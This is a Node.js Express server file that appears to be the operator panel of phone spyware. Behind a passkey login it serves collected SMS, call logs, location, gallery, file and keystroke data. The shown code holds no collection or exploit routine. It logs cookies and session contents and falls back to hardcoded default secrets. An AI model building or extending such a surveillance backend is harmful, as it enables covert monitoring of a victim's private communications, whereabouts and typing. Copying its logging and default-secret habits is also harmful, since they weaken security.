const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const session = require('express-session');
const FileStore = require('session-file-store')(session);
require('dotenv').config();

const app = express();

// Enable CORS with cookies
app.use(cors({
    origin: 'https://iosx.vercel.app', // Your frontend URL
    credentials: true, // Allow cookies to be sent in cross-origin requests
}));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Session configuration
app.use(session({
    store: new FileStore({ path: './sessions' }),
    secret: process.env.SESSION_SECRET || 'default_secret',
    resave: false,
    saveUninitialized: true,
    cookie: {
        secure: true, // Secure cookies for production (HTTPS)
        httpOnly: true,
        sameSite: 'none', // Required for cross-origin cookies
        maxAge: 24 * 60 * 60 * 1000, // Session expires in 1 day
    },
}));

// Middleware to log each request's session and cookie details
app.use((req, res, next) => {
    console.log("Incoming cookies:", req.headers.cookie);
    console.log("Session ID:", req.sessionID);
    console.log("Session content:", req.session);
    next();
});

// Your activity tracking data and routes
const correctPasskey = process.env.PASSKEY || "default_passkey";
let activityData = {
    Notifications: '',
    SMS: '',
    CallLogs: '',
    Location: '',
    SocialMedia: '',
    GalleryAccess: '',
    FileManager: '',
    Keystrokes: ''
};

// Login endpoint
app.post('/login', (req, res) => {
    const { passkey } = req.body;
    if (passkey === correctPasskey) {
        req.session.authenticated = true;
        console.log("User authenticated, session created.");
        res.status(200).json({ message: "Login successful" });
    } else {
        res.status(401).json({ message: "Incorrect passkey" });
    }
});

// Middleware to check if user is authenticated
function isAuthenticated(req, res, next) {
    if (req.session && req.session.authenticated) {
        next();
    } else {
        res.status(401).json({ message: "Unauthorized" });
    }
}

// Endpoint to check authentication status
app.get('/auth-status', (req, res) => {
    console.log("Checking auth status:", req.session.authenticated);
    res.status(200).json({ authenticated: !!req.session.authenticated });
});

// Endpoint to fetch activity data for authenticated clients
app.get('/fetch/:activityType', isAuthenticated, (req, res) => {
    const { activityType } = req.params;
    if (activityData[activityType] !== undefined) {
        res.json({ data: activityData[activityType] || "No data available" });
    } else {
        res.status(400).json({ message: "Invalid activity type" });
    }
});

// Logout endpoint
app.post('/logout', (req, res) => {
    req.session.destroy(() => {
        res.status(200).json({ message: "Logged out" });
    });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
